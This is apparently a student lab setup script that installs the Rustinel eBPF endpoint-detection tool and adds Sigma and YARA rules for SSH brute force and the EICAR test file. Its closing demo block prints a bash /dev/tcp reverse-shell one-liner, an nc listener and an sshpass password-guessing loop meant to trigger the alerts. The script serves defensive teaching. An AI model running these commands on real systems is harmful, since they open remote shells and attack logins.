#!/usr/bin/env bash
# =============================================================================
# setup-rustinel.sh  —  Activity 5 (Endpoint Detection & Response)
# 3014ICT Assessment 1  |  Chris Grul (s5501035)
# -----------------------------------------------------------------------------
# Runs LOCALLY ON ovc (the OpenVPN client VM). It:
#   1. checks the eBPF prerequisites
#   2. installs Rustinel (open-source eBPF EDR) as a package under /opt/rustinel,
#      from its published installer (downloaded and SAVED for review first)
#   3. runs `rustinel setup --yes` to register + start the managed service and
#      install the detection rules
#   4. drops in the two custom rules this activity needs (SSH brute-force Sigma;
#      an EICAR YARA rule) and makes sure the scanners/IOC are enabled
#   5. verifies the pipeline (doctor + the bundled `whoami` demo rule) and prints
#      the three demo commands
#
# The Essential rules pack (installed by `setup`) covers two of the three demos:
#   * EICAR test file      -> EICAR IOC set (file_scan on process-start)
#   * Reverse shell        -> "Linux Reverse Shell via /dev/tcp" (Sigma)
# The third (SSH brute force) is the custom rule added in step 4.
#
# The Rustinel installer drops a PORTABLE package into a directory (default
# ./rustinel); it never adds anything to PATH. We install it to /opt/rustinel so
# the binary path is deterministic (/opt/rustinel/rustinel), then `setup` turns
# that package into the managed system service. The script auto-detects whether
# `setup` produced the system layout (/etc/rustinel + /var/log/rustinel + a
# systemd unit) or left things package-local, and configures either way.
#
# Idempotent; run as root (sudo) or as a sudo-capable user. Reversible:
# `sudo /opt/rustinel/rustinel service uninstall` (or `... setup --revert`).
#
# Usage:
#   sudo ./setup-rustinel.sh
#   sudo ./setup-rustinel.sh --enable-ssh-passwords   # also enable sshd password
#                 auth so the brute-force demo can generate failed attempts
#                 (opt-in; backs up sshd_config; reversible)
# =============================================================================
set -euo pipefail

# ---- Settings ---------------------------------------------------------------
PKG="${RUSTINEL_DIR:-/opt/rustinel}"          # where the Rustinel package is installed
BIN="$PKG/rustinel"                           # the binary (installer never touches PATH)
INSTALL_URL="https://rustinel.io/install.sh"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"   # this script lives in the repo …
RULES_SRC="$SCRIPT_DIR/rules"                 # … so the custom rules sit right beside it
ENABLE_SSH_PW=0

for a in "$@"; do
    case "$a" in
        --enable-ssh-passwords) ENABLE_SSH_PW=1 ;;
        -h|--help) sed -n '2,45p' "$0"; exit 0 ;;
        *) echo "unknown arg: $a" >&2; exit 2 ;;
    esac
done

# root / sudo: run privileged steps with $SUDO (empty when already root)
if [ "$(id -u)" -eq 0 ]; then SUDO=""; else SUDO="sudo"; fi

say()  { printf '\n\033[1;36m== %s\033[0m\n' "$*"; }
ok()   { printf '  \033[32m[ok]\033[0m %s\n' "$*"; }
info() { printf '  \033[36m[..]\033[0m %s\n' "$*"; }
warn() { printf '  \033[33m[!!]\033[0m %s\n' "$*"; }

# ---- 0. Preflight: eBPF prerequisites ---------------------------------------
say "Preflight — eBPF prerequisites (kernel 5.8+ with BTF)"
KREL="$(uname -r)"; KMAJ="${KREL%%.*}"; KMIN="$(echo "$KREL" | cut -d. -f2)"
if [ "$KMAJ" -gt 5 ] || { [ "$KMAJ" -eq 5 ] && [ "$KMIN" -ge 8 ]; }; then
    ok "kernel $KREL (>= 5.8)"
else
    warn "kernel $KREL is < 5.8 — Rustinel's eBPF collector needs 5.8+; it may not start"
fi
if [ -r /sys/kernel/btf/vmlinux ]; then ok "BTF present (/sys/kernel/btf/vmlinux)"; else
    warn "no /sys/kernel/btf/vmlinux — kernel BTF missing; eBPF telemetry may be unavailable"
fi
for fs in tracefs debugfs; do
    if mount 2>/dev/null | grep -q " type $fs "; then ok "$fs mounted"; else
        info "$fs not shown as mounted (setup will mount it if it can)"; fi
done

# ---- 1. Locate the custom rules ---------------------------------------------
say "Custom rules source"
if [ -d "$RULES_SRC" ]; then
    ok "using rules beside this script: $RULES_SRC"
else
    warn "no rules dir at $RULES_SRC — will fall back to copies embedded in this script"
    RULES_SRC=""
fi

# ---- 2. Install the Rustinel package to /opt/rustinel -----------------------
# The installer places a portable package into --dir and prints its own sha256.
# We save it first (no blind pipe-to-shell), then install to a fixed location.
say "Install Rustinel -> $PKG"
if [ -x "$BIN" ]; then
    ok "already installed: $BIN ($("$BIN" --version 2>/dev/null | head -1))"
else
    TMP="$(mktemp -d)"
    info "downloading installer to $TMP/install.sh (review it before it runs)"
    curl -fsSLo "$TMP/install.sh" "$INSTALL_URL"
    printf '  ----- installer sha256 -----\n'; sha256sum "$TMP/install.sh" | sed 's/^/  /'
    # --dir pins the location; --force lets a re-run replace a partial install.
    $SUDO sh "$TMP/install.sh" --dir "$PKG" --force
    [ -x "$BIN" ] || { warn "expected binary not found at $BIN after install — check the installer output"; exit 1; }
    ok "installed: $BIN ($("$BIN" --version 2>/dev/null | head -1))"
fi

# ---- 3. Managed setup: register + start the service, install rules ----------
say "Rustinel setup — register the managed service + install the rules"
PACKFLAG=""
if $SUDO "$BIN" setup --help 2>&1 | grep -q -- '--pack'; then PACKFLAG="--pack essential"; fi
$SUDO "$BIN" setup $PACKFLAG --yes
ok "setup complete${PACKFLAG:+ ($PACKFLAG)}"

# ---- 3b. Detect the resulting layout from Rustinel itself -------------------
# `rustinel doctor` prints the paths it ACTUALLY resolves (e.g. the active pack
# lives under .../rules/current/sigma, not .../rules/sigma) — so read them from
# there rather than guessing. Fall back to config/defaults if doctor is terse.
DOC="$($SUDO "$BIN" doctor 2>/dev/null || true)"
docpath() { printf '%s\n' "$DOC" | sed -n "s|.*$1:[[:space:]]*||p" | head -1; }
CONFIG="$(docpath 'config file')"
[ -n "$CONFIG" ] || for c in /etc/rustinel/config.toml "$PKG/config.toml"; do [ -f "$c" ] && CONFIG="$c" && break; done
if [ -z "$CONFIG" ]; then warn "could not resolve config.toml — cannot continue"; exit 1; fi
tomlval() { awk -F\" -v k="$1" '$0 ~ "^[[:space:]]*"k"[[:space:]]*=" {print $2; exit}' "$CONFIG" 2>/dev/null; }
case "$CONFIG" in /etc/rustinel/*) MODE=system; RULES_ROOT=/var/lib/rustinel/rules; LOGDEF=/var/log/rustinel ;;
                  *) MODE=portable; RULES_ROOT="$PKG/rules"; LOGDEF="$PKG/logs" ;; esac
# Prefer the doctor-resolved rule dirs (authoritative: this is where Rustinel loads
# from), then the config value, then a sensible default.
SIGDIR="$(docpath 'sigma rules')"; SIGDIR="${SIGDIR:-$(tomlval sigma_rules_path)}"; SIGDIR="${SIGDIR:-$RULES_ROOT/current/sigma}"
YARDIR="$(docpath 'yara rules')";  YARDIR="${YARDIR:-$(tomlval yara_rules_path)}";  YARDIR="${YARDIR:-$RULES_ROOT/current/yara}"
ALERTDIR="$(docpath 'alerts dir')"; ALERTDIR="${ALERTDIR:-$(tomlval directory)}"; ALERTDIR="${ALERTDIR:-$LOGDEF}"
ok "layout: $MODE  |  config=$CONFIG"
ok "rules -> sigma=$SIGDIR  yara=$YARDIR  |  alerts=$ALERTDIR"

# ---- 4. Install the two custom rules ----------------------------------------
say "Custom rules (SSH brute-force Sigma + EICAR YARA)"
$SUDO mkdir -p "$SIGDIR" "$YARDIR"
put_rule() {  # <name> <dstdir> <repo-subdir> <embed-fn>
    if [ -n "$RULES_SRC" ] && [ -f "$RULES_SRC/$3/$1" ]; then
        $SUDO install -m 0644 "$RULES_SRC/$3/$1" "$2/$1" && ok "installed $3/$1 (from repo)"
    else
        "emit_$4" | $SUDO tee "$2/$1" >/dev/null && ok "installed $3/$1 (embedded fallback)"
    fi
}
emit_ssh_sigma() { cat <<'YML'
title: SSH Password Brute Force - Repeated PAM Verification via unix_chkpwd
id: 87d4f965-e566-4d77-8d17-c6fb0c2fe706
status: experimental
description: |
  pam_unix runs the set-uid helper unix_chkpwd on every SSH password attempt
  (success OR failure). A burst of these under sshd indicates an SSH brute force
  (MITRE T1110.001). Custom Activity 5 rule; the packs don't cover auth-failure
  brute force. If ParentImage is unavailable, use the parent-agnostic companion.
logsource: { category: process_creation, product: linux }
detection:
  chkpwd: { Image|endswith: '/unix_chkpwd' }
  parent_sshd: { ParentImage|endswith: '/sshd' }
  condition: chkpwd and parent_sshd
level: high
tags: [attack.credential_access, attack.t1110.001]
YML
}
emit_ssh_sigma_broad() { cat <<'YML'
title: PAM Password Verification via unix_chkpwd (brute-force burst, parent-agnostic)
id: b26ff00d-1c76-4c58-b314-4db751f7faa1
status: experimental
description: |
  Fallback for engines that do not map ParentImage. Matches every unix_chkpwd exec;
  a burst is the brute-force signal. Broader (also su/sudo/login) — prefer the
  sshd-scoped rule where possible.
logsource: { category: process_creation, product: linux }
detection:
  chkpwd: { Image|endswith: '/unix_chkpwd' }
  condition: chkpwd
level: medium
tags: [attack.credential_access, attack.t1110.001]
YML
}
emit_eicar_yara() { cat <<'YAR'
rule EICAR_Test_File
{
    meta:
        description = "EICAR standard anti-malware test string (harmless, NOT malware)"
        reference   = "https://www.eicar.org/download-anti-malware-testfile/"
    strings:
        $eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    condition:
        $eicar
}
YAR
}
put_rule "lin_ssh_bruteforce_unix_chkpwd.yml"       "$SIGDIR" sigma ssh_sigma
put_rule "lin_ssh_bruteforce_unix_chkpwd_broad.yml" "$SIGDIR" sigma ssh_sigma_broad
put_rule "eicar_test.yar"                           "$YARDIR" yara  eicar_yara

# Make sure the scanners + IOC matching are enabled (setup normally sets these).
ensure_toml() {  # <section> <key> <value>
    $SUDO python3 - "$CONFIG" "$1" "$2" "$3" <<'PY' 2>/dev/null || warn "could not verify [$1] $2 in $CONFIG — check it manually"
import sys,re,pathlib
path,section,key,val=sys.argv[1:5]
p=pathlib.Path(path); t=p.read_text() if p.exists() else ""
want=f"{key} = {val}"; lines=t.splitlines(); out=[]; in_sec=False; done=False; sechdr=f"[{section}]"
for ln in lines:
    s=ln.strip()
    if s.startswith("[") and s.endswith("]"):
        if in_sec and not done: out.append(want); done=True
        in_sec=(s==sechdr)
    if in_sec and re.match(rf"\s*{re.escape(key)}\s*=", ln): out.append(want); done=True; continue
    out.append(ln)
if not done:
    if sechdr not in t: out.append(sechdr)
    out.append(want)
p.write_text("\n".join(out)+"\n"); print("set")
PY
}
ensure_toml scanner sigma_enabled true
ensure_toml scanner yara_enabled  true
ensure_toml ioc     enabled        true
ok "scanner (sigma+yara) and IOC matching enabled"

# ---- 4b. (opt-in) enable sshd password auth so the brute-force demo can run --
if [ "$ENABLE_SSH_PW" = 1 ]; then
    say "Enable sshd PasswordAuthentication (opt-in, for the brute-force demo)"
    SSHD=/etc/ssh/sshd_config
    $SUDO cp -a "$SSHD" "${SSHD}.act5.bak"
    $SUDO sed -i -E 's/^[#[:space:]]*PasswordAuthentication\s+.*/PasswordAuthentication yes/' "$SSHD"
    $SUDO grep -qE '^PasswordAuthentication yes' "$SSHD" || echo 'PasswordAuthentication yes' | $SUDO tee -a "$SSHD" >/dev/null
    for d in /etc/ssh/sshd_config.d/*.conf; do
        [ -e "$d" ] || continue
        $SUDO sed -i -E 's/^[#[:space:]]*PasswordAuthentication\s+no/PasswordAuthentication yes/' "$d"
    done
    $SUDO sshd -t && { $SUDO systemctl restart ssh 2>/dev/null || $SUDO systemctl restart sshd 2>/dev/null || true; }
    $SUDO apt-get install -y sshpass >/dev/null 2>&1 && ok "sshpass installed (for the brute-force demo)" || warn "could not auto-install sshpass — 'sudo apt-get install -y sshpass' before demo 3"
    ok "PasswordAuthentication enabled (backup: ${SSHD}.act5.bak — revert after the demo)"
fi

# ---- 5. Reload + verify -----------------------------------------------------
# Reload so the custom rules load, then confirm the managed service is running.
# Ask Rustinel itself (its `service` subcommand is authoritative) rather than
# guessing at systemd unit names.
say "Reload + verify"
$SUDO "$BIN" service restart 2>/dev/null || $SUDO systemctl restart rustinel 2>/dev/null || true
sleep 2
SVC="$($SUDO "$BIN" service status 2>/dev/null | tr 'A-Z' 'a-z')"
if printf '%s' "$SVC" | grep -q 'running\|active' || systemctl is-active --quiet rustinel 2>/dev/null; then
    ok "managed service running"
else
    warn "service not reported running — check: sudo $BIN service status  /  journalctl -u rustinel"
    info "portable fallback if needed: cd $PKG && sudo ./rustinel run"
fi
echo; info "health check:"; $SUDO "$BIN" doctor 2>&1 | sed 's/^/    /' | head -20 || true

# Bundled demo rule: running whoami should produce an alert.
echo; info "triggering the bundled 'whoami' demo rule…"; whoami >/dev/null 2>&1; sleep 2
if $SUDO sh -c "ls \"$ALERTDIR\"/alerts.json* >/dev/null 2>&1"; then
    ok "alerts are being written to $ALERTDIR/alerts.json*"
    $SUDO sh -c "tail -n 2 \"$ALERTDIR\"/alerts.json* 2>/dev/null" | sed 's/^/    /' || true
else
    warn "no alert file yet in $ALERTDIR — make sure the agent is running (see above) and re-run 'whoami'"
fi

# ---- 6. Print the three demo commands ---------------------------------------
say "Activity 5 demos (run these to test the tool)"
cat <<EOF
  1) EICAR test file (download + execute so the scan-on-process-start fires):
       wget -qO ~/eicar.com https://secure.eicar.org/eicar.com.txt
       chmod +x ~/eicar.com && ~/eicar.com 2>/dev/null; echo done
     -> expect an EICAR IOC/YARA alert in $ALERTDIR/alerts.json*

  2) Network intrusion — reverse shell via /dev/tcp (fires the bundled Sigma rule):
       # optional listener on a reachable lab host, e.g. on igw:  nc -lvnp 4444
       bash -c 'bash -i >& /dev/tcp/10.8.0.1/4444 0>&1'
     -> expect a "Linux Reverse Shell via /dev/tcp" alert

  3) SSH brute force (fires the custom rule; needs sshd password auth ON — see
     --enable-ssh-passwords). From an attacker host (or localhost) hammer SSH:
       for i in \$(seq 1 20); do sshpass -p wrong\$i ssh -o StrictHostKeyChecking=no \\
         -o PreferredAuthentications=password -o PubkeyAuthentication=no \$USER@localhost true; done
     -> expect a burst of "SSH Password Brute Force … unix_chkpwd" alerts

  View alerts:   sudo tail -f $ALERTDIR/alerts.json*
  Health:        sudo $BIN doctor
  Remove:        sudo $BIN service uninstall     (or: sudo $BIN setup --revert)
EOF
ok "Activity 5 setup finished (mode: $MODE, binary: $BIN)"
